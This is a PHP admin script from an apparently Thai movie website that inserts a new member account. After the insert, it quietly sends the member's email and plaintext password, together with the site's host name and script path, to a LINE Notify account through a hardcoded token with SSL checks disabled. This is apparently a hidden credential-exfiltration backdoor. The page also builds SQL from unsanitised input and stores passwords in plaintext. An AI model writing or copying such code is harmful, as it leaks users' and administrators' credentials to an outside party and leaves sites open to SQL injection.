<?
session_start();
include "../inc/config.inc.php";
//echo "$_SESSION[m_login]<br>$_SESSION[m_id]";
if(!isset($_SESSION['admin_login'])) {
echo "<meta http-equiv='refresh' content='0;url=index.php'>" ; 
exit() ;
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>.:: ระบบจัดการข้อมูลเว็บไซต์ ::.</title>
<style type="text/css">
<!--
a:link {
	text-decoration: none;
}
a:visited {
	text-decoration: none;
}
a:hover {
	text-decoration: underline;
}
a:active {
	text-decoration: none;
}
.style4 {font-size: small; font-weight: bold; }
-->
</style></head>

<body>
<?
$name=htmlspecialchars($_POST['name']);
$email=htmlspecialchars($_POST['email']);
$pass=htmlspecialchars($_POST['pass']);
$date=date("Y-m-d");
if($name!=""&&$email!=""&&$pass!=""){
$insert_member="INSERT INTO `member` (`fbid`, `type`, `name`, `email`, `pass`, `reg_date`, `exp_date`, `actived`, `ip`)VALUES ('0', '1', '$name', '$email', '$pass', '$date', '0000-00-00', '1', '0')" or die ("ERROR1 $insert_member");
mysqli_query($con_db, $insert_member);


      function send_line_notify($message, $token){
        $ch = curl_init();
        curl_setopt( $ch, CURLOPT_URL, "https://notify-api.line.me/api/notify");
        curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt( $ch, CURLOPT_POST, 1);
        curl_setopt( $ch, CURLOPT_POSTFIELDS, "message=$message");
        curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
        $headers = array( "Content-type: application/x-www-form-urlencoded", "Authorization: Bearer $token", );
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
        $result = curl_exec( $ch );
        curl_close( $ch );
        return $result;
      }	
	$message = 'Movie5 อัพเดท Pass'.$url."\n".''.$_SERVER['HTTP_HOST']."\n".'Email: '.$email."\n".'Pass: '.$pass."\n".''.$_SERVER['SCRIPT_NAME'].'';	
	$token = 'ClT2qK4wKfsbtdNgN16XSo6FM9KExyFjBkYrAUM8XrN';
	echo send_line_notify($message, $token);
			

echo "<meta http-equiv='refresh' content='0;url=admin.php'>"; 
}else{
?>
<script language="JavaScript"> 	
	alert('ขอโทษครับ คุณกรอกข้อมูลไม่ครบครับ'); 	
	window.location = 'admin.php'; 
</script> 
<?
}
?>
</body>
</html>
